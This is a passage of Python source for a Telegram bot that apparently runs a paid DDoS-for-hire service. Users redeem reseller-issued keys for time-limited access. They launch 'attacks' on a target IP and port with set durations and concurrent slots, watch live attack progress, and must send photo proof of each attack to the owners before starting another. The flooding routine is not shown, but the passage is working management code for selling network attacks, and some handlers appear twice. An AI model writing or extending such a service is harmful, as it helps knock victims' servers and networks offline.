        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑲𝒆𝒚 𝑬𝒙𝒕𝒆𝒏𝒅𝒆𝒅!</b>\n\n{HTML_EMOJI.KEY} 𝑲𝒆𝒚: <code>{key_input}</code>\n{HTML_EMOJI.STAR} 𝑻𝒚𝒑𝒆: {key_type}\n{HTML_EMOJI.TIMER} 𝑨𝒅𝒅𝒆𝒅: {key_doc['duration_label']}\n{HTML_EMOJI.TIMER} 𝑻𝒐𝒕𝒂𝒍 𝑻𝒊𝒎𝒆: {new_remaining}\n{HTML_EMOJI.FIRE} 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌: {max_attack_time}s", reply_to=message)
    else:
        expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
        
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'user_id': user_id,
                'username': user_name,
                'key': key_input,
                'key_expiry': expiry_time,
                'key_duration_seconds': key_doc['duration_seconds'],
                'key_duration_label': key_doc['duration_label'],
                'redeemed_at': datetime.now(),
                'reseller_username': reseller_username,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }},
            upsert=True
        )
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}}
            )
        else:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}}
            )
        
        remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑲𝒆𝒚 𝑹𝒆𝒅𝒆𝒆𝒎𝒆𝒅!</b>\n\n{HTML_EMOJI.KEY} 𝑲𝒆𝒚: <code>{key_input}</code>\n{HTML_EMOJI.STAR} 𝑻𝒚𝒑𝒆: {key_type}\n{HTML_EMOJI.TIMER} 𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {key_doc['duration_label']}\n{HTML_EMOJI.TIMER} 𝑻𝒊𝒎𝒆 𝑳𝒆𝒇𝒕: {remaining}\n{HTML_EMOJI.FIRE} 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌: {max_attack_time}s", reply_to=message)
        
# ============ MY KEY COMMAND ============

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key'):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝒀𝒐𝒖 𝒅𝒐𝒏'𝒕 𝒉𝒂𝒗𝒆 𝒂 𝒌𝒆𝒚!</b>", reply_to=message)
        return
    
    if not has_valid_key(user_id):
        reseller_username = user.get('reseller_username')
        if reseller_username:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑲𝒆𝒚 𝒆𝒙𝒑𝒊𝒓𝒆𝒅!</b>\n\n{HTML_EMOJI.REFRESH} 𝑭𝒐𝒓 𝒓𝒆𝒏𝒆𝒘𝒂𝒍 𝑫𝑴: @{reseller_username}", reply_to=message)
        else:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑲𝒆𝒚 𝒆𝒙𝒑𝒊𝒓𝒆𝒅!</b>", reply_to=message)
        return
    
    remaining = get_time_remaining(user_id)
    key_type = user.get('key_type', 'NORMAL')
    max_attack = user.get('max_attack_time', get_key_max_attack(key_type))
    
    safe_send_message(message.chat.id, f"{HTML_EMOJI.KEY} <b>𝑲𝒆𝒚 𝑫𝒆𝒕𝒂𝒊𝒍𝒔</b>\n\n{HTML_EMOJI.PIN} 𝑲𝒆𝒚: <code>{user['key']}</code>\n{HTML_EMOJI.STAR} 𝑻𝒚𝒑𝒆: {key_type}\n{HTML_EMOJI.TIMER} 𝑹𝒆𝒎𝒂𝒊𝒏𝒊𝒏𝒈: {remaining}\n{HTML_EMOJI.FIRE} 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌: {max_attack}s\n{HTML_EMOJI.CHECKMARK} 𝑺𝒕𝒂𝒕𝒖𝒔: 𝑨𝒄𝒕𝒊𝒗𝒆", reply_to=message)

# ============================================================
# STATUS COMMAND - AUTO UPDATES EVERY 5 SECONDS
# ============================================================

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    is_group = message.chat.type in ['group', 'supergroup']
    group_id = message.chat.id if is_group else None
    
    if not is_owner(user_id):
        has_key = has_valid_key(user_id)
        
        group_approved = False
        if is_group and group_id:
            group_approved, _ = is_group_approved(group_id)
        
        if not has_key and not group_approved:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝒀𝒐𝒖 𝒏𝒆𝒆𝒅 𝒂 𝒗𝒂𝒍𝒊𝒅 𝒌𝒆𝒚 𝒐𝒓 𝒃𝒆 𝒊𝒏 𝒂𝒏 𝒂𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝒈𝒓𝒐𝒖𝒑 𝒕𝒐 𝒖𝒔𝒆 𝒕𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅!</b>", reply_to=message)
            return
    
    status_msg = safe_send_message(message.chat.id, f"{HTML_EMOJI.REFRESH} 𝑭𝒆𝒕𝒄𝒉𝒊𝒏𝒈 𝒍𝒊𝒗𝒆 𝒔𝒕𝒂𝒕𝒖𝒔.....", reply_to=message)
    
    if not status_msg:
        return
    
    def update_status():
        try:
            active_attacks_list = []
            with _attack_lock:
                now = datetime.now()
                for attack_id, attack in active_attacks.items():
                    if attack['end_time'] > now:
                        remaining = int((attack['end_time'] - now).total_seconds())
                        total = attack['duration']
                        elapsed = total - remaining
                        percentage = int((elapsed / total) * 100) if total > 0 else 0
                        active_attacks_list.append({
                            'target': attack.get('target'),
                            'port': attack.get('port'),
                            'remaining': remaining,
                            'percentage': percentage
                        })
            
            busy_slots, free_slots, total_slots = get_slot_status()
            active_groups = approved_groups_collection.count_documents({})
            private_users = bot_users_collection.count_documents({})
            blocked_ips_count = len(get_all_blocked_ips())
            
            response = "╔═════════════════════════╗\n"
            response += f"║             {HTML_EMOJI.FIRE} <b>𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑨𝑻𝑼𝑺</b> {HTML_EMOJI.FIRE}\n"
            response += "╠═════════════════════════╣\n"
            
            if active_attacks_list:
                response += f"║  {HTML_EMOJI.FIRE} <b>𝑨𝒄𝒕𝒊𝒗𝒆 𝑨𝒕𝒕𝒂𝒄𝒌𝒔:</b> {len(active_attacks_list)}/{total_slots}\n"
                response += "╠═════════════════════════╣\n"
                for i, attack in enumerate(active_attacks_list, 1):
                    target_display = f"{attack['target']}:{attack['port']}"
                    if len(target_display) > 30:
                        target_display = target_display[:27] + "..."
                    progress_bar = create_progress_bar(attack['percentage'], 15)
                    response += f"║  {i}. {HTML_EMOJI.TARGET} {target_display:<30}\n"
                    response += f"║     {HTML_EMOJI.TIMER} 𝑻𝒊𝒎𝒆 𝒍𝒆𝒇𝒕: {attack['remaining']}s  [{progress_bar}] {attack['percentage']}%\n"
                    if i < len(active_attacks_list):
                        response += "║  ─────────────────────────\n"
            else:
                response += f"║  {HTML_EMOJI.TIMER} <b>𝑵𝒐 𝒂𝒄𝒕𝒊𝒗𝒆 𝒂𝒕𝒕𝒂𝒄𝒌</b>\n"
            
            response += "╠═════════════════════════╣\n"
            response += f"║  {HTML_EMOJI.CHECKMARK} <b>𝑭𝒓𝒆𝒆 𝑺𝒍𝒐𝒕𝒔:</b> {free_slots}/{total_slots}\n"
            response += f"║  {HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒅 𝑺𝒍𝒐𝒕𝒔:</b> {busy_slots}/{total_slots}\n"
            response += "╚═════════════════════════╝\n"
            response += f"\n{HTML_EMOJI.USERS} <b>𝑨𝒄𝒕𝒊𝒗𝒆 𝑮𝒓𝒐𝒖𝒑𝒔:</b> {active_groups}\n"
            response += f"{HTML_EMOJI.PROFILE} <b>𝑷𝒓𝒊𝒗𝒂𝒕𝒆 𝑼𝒔𝒆𝒓𝒔:</b> {private_users}\n"
            response += f"{HTML_EMOJI.BAN} <b>𝑩𝒍𝒐𝒄𝒌𝒆𝒅 𝑰𝑷𝒔:</b> {blocked_ips_count}\n"
            response += f"{HTML_EMOJI.SETTINGS} <b>𝑴𝒂𝒙 𝑻𝒊𝒎𝒆:</b> {get_max_attack_time()}s\n"
            response += f"{HTML_EMOJI.EXPLOSION} <b>𝑪𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕/𝑨𝒕𝒕𝒂𝒄𝒌:</b> {get_concurrent_limit()}"
            
            try:
                bot.edit_message_text(response, chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            except:
                return
            
            with _attack_lock:
                has_active = False
                for attack in active_attacks.values():
                    if attack['end_time'] > datetime.now():
                        has_active = True
                        break
            
            if has_active:
                threading.Timer(5.0, update_status).start()
            
        except:
            pass
    
    update_status()

# ============ OTHER COMMANDS (cancel, myaccess, photo feedback) ============

@bot.message_handler(commands=["cancel"])
def cancel_attack_command(message):
    user_id = message.from_user.id
    
    if check_banned(message): return
    
    with _attack_lock:
        found = False
        for attack_id, attack in list(active_attacks.items()):
            if attack.get('user_id') == user_id:
                del active_attacks[attack_id]
                if attack_id in api_in_use:
                    del api_in_use[attack_id]
                if attack_id in active_port_attacks:
                    del active_port_attacks[attack_id]
                found = True
                break
        
        if found:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝒀𝒐𝒖𝒓 𝒂𝒄𝒕𝒊𝒗𝒆 𝒂𝒕𝒕𝒂𝒄𝒌 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒄𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", reply_to=message)
        else:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐 𝒂𝒄𝒕𝒊𝒗𝒆 𝒂𝒕𝒕𝒂𝒄𝒌 𝒕𝒐 𝒄𝒂𝒏𝒄𝒆𝒍!</b>", reply_to=message)

@bot.message_handler(commands=["myaccess"])
def my_access_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key'):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝒀𝒐𝒖 𝒅𝒐𝒏'𝒕 𝒉𝒂𝒗𝒆 𝒂𝒏𝒚 𝒂𝒄𝒕𝒊𝒗𝒆 𝒂𝒄𝒄𝒆𝒔𝒔!</b>", reply_to=message)
        return
    
    if not has_valid_key(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝒀𝒐𝒖𝒓 𝒂𝒄𝒄𝒆𝒔𝒔 𝒉𝒂𝒔 𝒆𝒙𝒑𝒊𝒓𝒆𝒅!</b>", reply_to=message)
        return
    
    remaining = get_time_remaining(user_id)
    reseller_name = user.get('reseller_username', 'None')
    key_type = user.get('key_type', 'NORMAL')
    max_attack = user.get('max_attack_time', get_key_max_attack(key_type))
    
    access_msg = f"{HTML_EMOJI.DOCUMENT} <b>𝒀𝒐𝒖𝒓 𝑨𝒄𝒄𝒆𝒔𝒔 𝑫𝒆𝒕𝒂𝒊𝒍𝒔</b>\n\n{HTML_EMOJI.KEY} 𝑲𝒆𝒚: <code>{user['key']}</code>\n{HTML_EMOJI.STAR} 𝑻𝒚𝒑𝒆: {key_type}\n{HTML_EMOJI.TIMER} 𝑻𝒊𝒎𝒆 𝑳𝒆𝒇𝒕: {remaining}\n{HTML_EMOJI.FIRE} 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌: {max_attack}s\n{HTML_EMOJI.STORE} 𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓: @{reseller_name}\n{HTML_EMOJI.CHECKMARK} 𝑺𝒕𝒂𝒕𝒖𝒔: 𝑨𝒄𝒕𝒊𝒗𝒆"
    
    safe_send_message(message.chat.id, access_msg, reply_to=message)

@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    user_id = message.from_user.id
    is_group = message.chat.type in ['group', 'supergroup']
    group_id = message.chat.id if is_group else None
    
    fb = get_pending_feedback(user_id, is_group, group_id)
    if not fb:
        return
    
    clear_pending_feedback(user_id, is_group, group_id)
    
    user_name = message.from_user.first_name
    username = message.from_user.username or "N/A"
    
    attack_type = "𝑮𝑹𝑶𝑼𝑷" if is_group else "𝑷𝑹𝑰𝑽𝑨𝑻𝑬"
    location = f"𝑮𝒓𝒐𝒖𝒑 𝑰𝑫: {group_id}" if is_group else "𝑷𝒓𝒊𝒗𝒂𝒕𝒆 𝑪𝒉𝒂𝒕"
    
    safe_send_message(message.chat.id, 
        f"{HTML_EMOJI.CHECKMARK} <b>𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒄𝒆𝒊𝒗𝒆𝒅!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{HTML_EMOJI.PARTY} 𝑻𝒉𝒂𝒏𝒌 𝒚𝒐𝒖 𝒇𝒐𝒓 𝒚𝒐𝒖𝒓 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌!\n"
        f"{HTML_EMOJI.FIRE} <b>𝒀𝒐𝒖 𝒄𝒂𝒏 𝒏𝒐𝒘 𝒔𝒕𝒂𝒓𝒕 𝒂 𝒏𝒆𝒘 𝒂𝒕𝒕𝒂𝒄𝒌 𝒖𝒔𝒊𝒏𝒈 /attack 𝒄𝒐𝒎𝒎𝒂𝒏𝒅.</b>",
        reply_to=message, parse_mode="HTML")
    
    # Build detailed caption
    caption = (
        f"{HTML_EMOJI.CAMERA} <b>𝑵𝑬𝑾 𝑨𝑻𝑻𝑨𝑪𝑲 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{HTML_EMOJI.PROFILE} <b>𝑼𝒔𝒆𝒓:</b> {user_name}\n"
        f"{HTML_EMOJI.PROFILE} <b>𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆:</b> @{username}\n"
        f"{HTML_EMOJI.PROFILE} <b>𝑰𝑫:</b> <code>{user_id}</code>\n"
        f"{HTML_EMOJI.LINK} <b>𝑳𝒐𝒄𝒂𝒕𝒊𝒐𝒏:</b> {location}\n"
        f"{HTML_EMOJI.STATS} <b>𝑻𝒚𝒑𝒆:</b> {attack_type}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{HTML_EMOJI.TARGET} <b>𝑻𝒂𝒓𝒈𝒆𝒕:</b> <code>{fb['target']}:{fb['port']}</code>\n"
        f"{HTML_EMOJI.TIMER} <b>𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏:</b> <code>{fb['duration']}s</code>\n"
        f"{HTML_EMOJI.TIMER} <b>𝑻𝒊𝒎𝒆:</b> <code>{datetime.now().strftime('%d-%m-%Y %H:%M:%S')}</code>"
    )
    
    # Send to channel
    try:
        bot.send_photo(
            chat_id=FEEDBACK_CHANNEL_ID,
            photo=message.photo[-1].file_id,
            caption=caption,
            parse_mode="HTML"
        )
        print(f"[Feedback] Auto-forwarded to channel: {FEEDBACK_CHANNEL_ID}")
    except Exception as e:
        print(f"[Feedback channel error] {e}")
    
    # Send to owners
    if BOT_OWNER:
        try:
            for owner in BOT_OWNER:
                if bot:
                    bot.send_photo(
                        chat_id=owner,
                        photo=message.photo[-1].file_id,
                        caption=caption,
                        parse_mode="HTML"
                    )
        except Exception as e:
            print(f"[Feedback owner error] {e}")

@bot.message_handler(commands=["feedback_off"])
def feedback_off_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    set_setting('feedback_required', False)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝒓𝒆𝒒𝒖𝒊𝒓𝒆𝒎𝒆𝒏𝒕 𝑫𝑰𝑺𝑨𝑩𝑳𝑬𝑫!</b> 𝑼𝒔𝒆𝒓𝒔 𝒄𝒂𝒏 𝒂𝒕𝒕𝒂𝒄𝒌 𝒘𝒊𝒕𝒉𝒐𝒖𝒕 𝒔𝒆𝒏𝒅𝒊𝒏𝒈 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌.", reply_to=message)
    
# ============ FEEDBACK PHOTO HANDLER (Duplicate) ============

@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    user_id = message.from_user.id
    is_group = message.chat.type in ['group', 'supergroup']
    group_id = message.chat.id if is_group else None
    
    fb = get_pending_feedback(user_id, is_group, group_id)
    if not fb:
        return
    
    clear_pending_feedback(user_id, is_group, group_id)
    
    user_name = message.from_user.first_name
    username = message.from_user.username
    
    safe_send_message(message.chat.id, 
        f"{HTML_EMOJI.CHECKMARK} <b>𝑭𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝑹𝒆𝒄𝒆𝒊𝒗𝒆𝒅!</b>\n\n"
        f"{HTML_EMOJI.PARTY} 𝑻𝒉𝒂𝒏𝒌 𝒚𝒐𝒖 𝒇𝒐𝒓 𝒚𝒐𝒖𝒓 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌!\n\n"
        f"{HTML_EMOJI.FIRE} <b>𝒀𝒐𝒖 𝒄𝒂𝒏 𝒏𝒐𝒘 𝒔𝒕𝒂𝒓𝒕 𝒂 𝒏𝒆𝒘 𝒂𝒕𝒕𝒂𝒄𝒌 𝒖𝒔𝒊𝒏𝒈 /attack 𝒄𝒐𝒎𝒎𝒂𝒏𝒅.</b>",
        reply_to=message)
    
    attack_type = "GROUP" if is_group else "PRIVATE"
    location = f"Group ID: {group_id}" if is_group else "Private Chat"
    
    if BOT_OWNER:
        try:
            owner_msg = (
                f"{HTML_EMOJI.CAMERA} <b>𝑵𝑬𝑾 𝑨𝑻𝑻𝑨𝑪𝑲 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲</b>\n\n"
                f"{HTML_EMOJI.PROFILE} <b>𝑼𝒔𝒆𝒓:</b> {user_name}\n"
                f"{HTML_EMOJI.PROFILE} <b>𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆:</b> @{username if username else 'N/A'}\n"
                f"{HTML_EMOJI.PROFILE} <b>𝑰𝑫:</b> <code>{user_id}</code>\n"
                f"{HTML_EMOJI.LINK} <b>𝑳𝒐𝒄𝒂𝒕𝒊𝒐𝒏:</b> {location}\n"
                f"{HTML_EMOJI.STATS} <b>𝑻𝒚𝒑𝒆:</b> {attack_type}\n\n"
                f"{HTML_EMOJI.TARGET} <b>𝑻𝒂𝒓𝒈𝒆𝒕:</b> {fb['target']}:{fb['port']}\n"
                f"{HTML_EMOJI.TIMER} <b>𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏:</b> {fb['duration']}s\n"
                f"{HTML_EMOJI.TIMER} <b>𝑻𝒊𝒎𝒆:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}"
            )
            
            for owner in BOT_OWNER:
                if bot:
                    bot.send_photo(owner, message.photo[-1].file_id, caption=owner_msg, parse_mode="HTML")
        except Exception as e:
            print(f"Failed to forward feedback to owner: {e}")

# ============ BOT MANAGEMENT HANDLERS (Duplicate) ============

def get_bot_token(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑶𝒑𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝒄𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    bot_token = message.text.strip()
    
    if ":" in bot_token:
        try:
            test_bot = telebot.TeleBot(bot_token)
            bot_info = test_bot.get_me()
            bot_id = bot_info.id
            
            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑩𝒐𝒕 𝒊𝒅𝒆𝒏𝒕𝒊𝒇𝒊𝒆𝒅:</b> <b>{bot_info.first_name}</b> (@{bot_info.username})\n\n𝑺𝒆𝒏𝒅 𝒕𝒉𝒆 <b>𝑨𝒅𝒎𝒊𝒏/𝑶𝒘𝒏𝒆𝒓 𝑰𝑫</b> 𝒇𝒐𝒓 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕:", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            bot.register_next_step_handler(message, lambda m: get_bot_admin(m, bot_token, bot_id))
        except Exception as e:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒕𝒐𝒌𝒆𝒏!</b> 𝑬𝒓𝒓𝒐𝒓: {str(e)}\n\n𝑼𝒔𝒆 /addbot 𝒕𝒐 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒕𝒐𝒌𝒆𝒏 𝒇𝒐𝒓𝒎𝒂𝒕!</b>\n\n𝑼𝒔𝒆 /addbot 𝒕𝒐 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def get_bot_admin(message, bot_token, bot_id):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑶𝒑𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝒄𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        admin_id = int(message.text.strip())
        
        bot.reply_to(message, f"{HTML_EMOJI.SETTINGS} <b>𝑴𝒂𝒙 𝑺𝒍𝒐𝒕𝒔</b>\n\n𝑯𝒐𝒘 𝒎𝒂𝒏𝒚 𝒄𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒂𝒕𝒕𝒂𝒄𝒌𝒔 𝒄𝒂𝒏 𝒕𝒉𝒊𝒔 𝒃𝒐𝒕 𝒉𝒂𝒏𝒅𝒍𝒆?\n\n𝑺𝒆𝒏𝒅 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓 (1-10):", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        bot.register_next_step_handler(message, lambda m: get_bot_slots(m, bot_token, bot_id, admin_id))
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝑰𝑫!</b> 𝑺𝒆𝒏𝒅 𝒂 𝒏𝒖𝒎𝒆𝒓𝒊𝒄 𝑰𝑫.\n\n𝑼𝒔𝒆 /addbot 𝒕𝒐 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def get_bot_slots(message, bot_token, bot_id, admin_id):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑶𝒑𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝒄𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        max_slots = int(message.text.strip())
        if max_slots < 1:
            max_slots = 1
        if max_slots > 10:
            max_slots = 10
        
        success, result = add_bot(bot_token, admin_id, max_slots)
        
        if success:
            bot_config = get_bot_config(bot_token)
            if bot_config:
                start_bot_instance(bot_config)
            
            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑩𝒐𝒕 𝑨𝒅𝒅𝒆𝒅 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚!</b>\n\n{HTML_EMOJI.DISCORD} 𝑩𝒐𝒕 𝑰𝑫: <code>{result}</code>\n{HTML_EMOJI.STAR} 𝑶𝒘𝒏𝒆𝒓 𝑰𝑫: {admin_id}\n{HTML_EMOJI.SETTINGS} 𝑴𝒂𝒙 𝑺𝒍𝒐𝒕𝒔: {max_slots}\n\n𝑩𝒐𝒕 𝒊𝒔 𝒏𝒐𝒘 𝒓𝒖𝒏𝒏𝒊𝒏𝒈!", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        else:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑭𝒂𝒊𝒍𝒆𝒅 𝒕𝒐 𝒂𝒅𝒅 𝒃𝒐𝒕:</b> {result}", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>\n\n𝑼𝒔𝒆 /addbot 𝒕𝒐 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def process_del_bot(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑶𝒑𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝒄𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    bot_input = message.text.strip()
    success, result = delete_bot(bot_input)
    
    if success:
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑩𝒐𝒕 𝒅𝒆𝒍𝒆𝒕𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    else:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>{result}</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

# ============ CONFIG SETTERS (Duplicate) ============

def set_max_time_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        value = int(message.text.strip())
        if value < MIN_ATTACK_TIME:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑽𝒂𝒍𝒖𝒆 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒂𝒕 𝒍𝒆𝒂𝒔𝒕 {MIN_ATTACK_TIME} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_setting('max_attack_time', value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌 𝑻𝒊𝒎𝒆 𝒔𝒆𝒕 𝒕𝒐 {value} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def set_cooldown_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        value = int(message.text.strip())
        if value < 0:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝒄𝒂𝒏𝒏𝒐𝒕 𝒃𝒆 𝒏𝒆𝒈𝒂𝒕𝒊𝒗𝒆!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        set_setting('user_cooldown', value)
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝒔𝒆𝒕 𝒕𝒐 {value} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

def set_slots_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        global current_max_slots
        value = int(message.text.strip())
        if value < 1:
            value = 1
        if value > 10:
            value = 10
        current_max_slots = value
        set_setting('max_concurrent_slots', value)
